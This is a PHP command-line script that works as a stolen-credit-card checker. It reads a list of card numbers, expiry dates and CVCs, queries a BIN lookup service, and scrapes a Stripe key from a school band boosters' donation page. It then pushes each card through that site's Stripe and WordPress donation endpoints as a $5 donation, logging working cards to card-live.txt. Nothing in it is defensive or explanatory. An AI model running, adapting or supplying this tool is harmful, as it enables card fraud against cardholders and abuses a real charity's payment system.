 <?php
  echo "List Creditcard  : ";
$xyz = trim(fgets(STDIN));
$no = 1;
$jml = count(explode("\n", str_replace("\r", "", file_get_contents($xyz))));
console::log("Total Creditcard : $jml", 'white');
echo "\n";
foreach (explode("\n", str_replace("\r", "", file_get_contents($xyz))) as $key => $akun) {
  $pecah = explode("|", trim($akun));
  $card = trim($pecah[0]);
  $month = trim($pecah[1]);
  $year = trim($pecah[2]);
  $cvc = trim($pecah[3]);

  $no = 1;
  $rest = substr("'.$card.'", 2, -12);
  $bin = curl('https://binlist.io/lookup/'.$rest.'/', null, null);
  $json = json_decode($bin[1], true);
  $type = $json['type'];
  $iin = $json['number']['iin'];
  $scheme = $json['scheme'];
  $cate = $json['category'];
  $country = $json['bank']['name'];

  $pktoken = curl('https://www.milfordbands.org/support-us/donations/', null, null);
  $token = get_between($pktoken[1], '{"p_key":"', '"');
  // echo "token : $token\n";

  $headers = array();
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';

  $gas = curl('https://api.stripe.com/v1/payment_methods', 'type=card&billing_details[email]=pulswer%40gmail.com&billing_details[address][postal_code]=97220&card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&pasted_fields=exp%2Cnumber%2Czip&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4805489&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'', $headers);
  $json = json_decode($gas[1], true);
  $token2 = $json['id'];
// print_r($gas);


  $tok = curl('https://api.stripe.com/v1/tokens', 'card[number]='.$card.'&card[cvc]='.$cvc.'&card[exp_month]='.$month.'&card[exp_year]='.$year.'&card[address_zip]=97220&guid=NA&muid=a9e232b1-7967-4f6a-beea-55fb586432df&sid=2e685b40-8026-422d-84cc-54e2610eb298&payment_user_agent=stripe.js%2F1c244104%3B+stripe-js-v3%2F1c244104&time_on_page=4728495&referrer=https%3A%2F%2Fwww.milfordbands.org%2Fsupport-us%2Fdonations%2F&key='.$token.'&pasted_fields=exp%2Cnumber%2Czip', $headers);
  $json = json_decode($tok[1], true);
  $idtoken = $json['id'];

  $headers1 = array();
  $headers1[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0';
  $headers1[] = 'Accept: */*';
  $headers1[] = 'Accept-Language: id,en-US;q=0.7,en;q=0.3';
  $headers1[] = 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8';
  $headers1[] = 'Origin: https://www.milfordbands.org';
  $headers1[] = 'Connection: close';
  $headers1[] = 'Referer: https://www.milfordbands.org/support-us/donations/';
  $headers1[] = 'Cookie: __stripe_mid=a9e232b1-7967-4f6a-beea-55fb586432df; __stripe_sid=ed898f95-480d-4afb-874b-2ecae2317646';

  $pktoken = curl('https://www.milfordbands.org/wp-admin/admin-ajax.php', 'action=ds_process_button&stripeToken='.$idtoken.'&paymentMethodID='.$token2.'&allData%5BbillingDetails%5D%5Bemail%5D=pulswer%40gmail.com&type=donation&amount=5&params%5Bname%5D=Milford+Bands&params%5Bamount%5D=&params%5Boriginal_amount%5D=5&params%5Bdescription%5D=Milford+Bands+Donation+Page&params%5Bpanellabel%5D=Donate+to+Us!&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=true&params%5Bcapture%5D=true&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=&params%5Bcustom_role%5D=&params%5Bbilling%5D=false&params%5Bshipping%5D=false&params%5Brememberme%5D=false&params%5Bkey%5D='.$token.'&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.milfordbands.org%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fmilfordbands.org%2Fwp-content%2Fuploads%2F2018%2F12%2FMilfordBandFB-1-2.jpg&params%5Bgeneral_currency%5D=USD&params%5Bgeneral_billing%5D=&params%5Bgeneral_shipping%5D=&params%5Bgeneral_rememberme%5D=&params%5Binstance%5D=ds5eab4b33d035e&params%5Bds_nonce%5D=7d485c3e5a&ds_nonce=7d485c3e5a', $headers1);
   if (strpos($pktoken[1], 'On behalf of the Milford Band Boosters and our students, thank you so much for your generous contribution to our band and extracurricular band booster programs at Milford Exempted Village School District.')) {
    console::log("[Total $no/$jml ] [Live] | $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country", 'green');
    fwrite(fopen("card-live.txt", "a"), "[Live] | $card|$month|$year|$cvc \n");
  } if (strpos($pktoken[1], 'Your card was declined.')) {
    console::log("[Total $no/$jml] [Die] | $card|$month|$year|$cvc Bin Info : $iin - $scheme $type $cate $country", 'red');
  }
  $no++;
}


    function curl($url,$post,$headers)
{
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 1);
  if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  if ($post !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
  $result = curl_exec($ch);
  $header = substr($result, 0, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
  $body = substr($result, curl_getinfo($ch, CURLINFO_HEADER_SIZE));
  preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
  $cookies = array();
  foreach($matches[1] as $item) {
    parse_str($item, $cookie);
    $cookies = array_merge($cookies, $cookie);
  }
  return array (
  $header,
  $body,
  $cookies
  );
}

function get_between($string, $start, $end) 
    {
        $string = " ".$string;
        $ini = strpos($string,$start);
        if ($ini == 0) return "";
        $ini += strlen($start);
        $len = strpos($string,$end,$ini) - $ini;
        return substr($string,$ini,$len);
    }

    class Console {
 
    static $foreground_colors = array(
        'bold'         => '1',    'dim'          => '2',
        'black'        => '0;30', 'dark_gray'    => '1;30',
        'blue'         => '0;34', 'light_blue'   => '1;34',
        'green'        => '0;32', 'light_green'  => '1;32',
        'cyan'         => '0;36', 'light_cyan'   => '1;36',
        'red'          => '0;31', 'light_red'    => '1;31',
        'purple'       => '0;35', 'light_purple' => '1;35',
        'brown'        => '0;33', 'yellow'       => '1;33',
        'light_gray'   => '0;37', 'white'        => '1;37',
        'normal'       => '0;39',
    );
    
    static $background_colors = array(
        'black'        => '40',   'red'          => '41',
        'green'        => '42',   'yellow'       => '43',
        'blue'         => '44',   'magenta'      => '45',
        'cyan'         => '46',   'light_gray'   => '47',
    );
 
    static $options = array(
        'underline'    => '4',    'blink'         => '5', 
        'reverse'      => '7',    'hidden'        => '8',
    );

    static $EOF = "\n";

    /**
     * Logs a string to console.
     * @param  string  $str        Input String
     * @param  string  $color      Text Color
     * @param  boolean $newline    Append EOF?
     * @param  [type]  $background Background Color
     * @return [type]              Formatted output
     */
    public static function log($str = '', $color = 'normal', $newline = true, $background_color = null)
    {
        if( is_bool($color) )
        {
            $newline = $color;
            $color   = 'normal';
        }
        elseif( is_string($color) && is_string($newline) )
        {
            $background_color = $newline;
            $newline          = true;
        }
        $str = $newline ? $str . self::$EOF : $str;

        echo self::$color($str, $background_color);
    }
    
    /**
     * Anything below this point (and its related variables):
     * Colored CLI Output is: (C) Jesse Donat
     * https://gist.github.com/donatj/1315354
     * -------------------------------------------------------------
     */
    
    /**
     * Catches static calls (Wildcard)
     * @param  string $foreground_color Text Color
     * @param  array  $args             Options
     * @return string                   Colored string
     */
    public static function __callStatic($foreground_color, $args)
    {
        $string         = $args[0];
        $colored_string = "";
 
        // Check if given foreground color found
        if( isset(self::$foreground_colors[$foreground_color]) ) {
            $colored_string .= "\033[" . self::$foreground_colors[$foreground_color] . "m";
        }
        else{
            die( $foreground_color . ' not a valid color');
        }
        
        array_shift($args);

        foreach( $args as $option ){
            // Check if given background color found
            if(isset(self::$background_colors[$option])) {
                $colored_string .= "\033[" . self::$background_colors[$option] . "m";
            }
            elseif(isset(self::$options[$option])) {
                $colored_string .= "\033[" . self::$options[$option] . "m";
            }
        }
        
        // Add string and end coloring
        $colored_string .= $string . "\033[0m";
        
        return $colored_string;
        
    }
 
    /**
     * Plays a bell sound in console (if available)
     * @param  integer $count Bell play count
     * @return string         Bell play string
     */
    public static function bell($count = 1) {
        echo str_repeat("\007", $count);
    }
 
} 
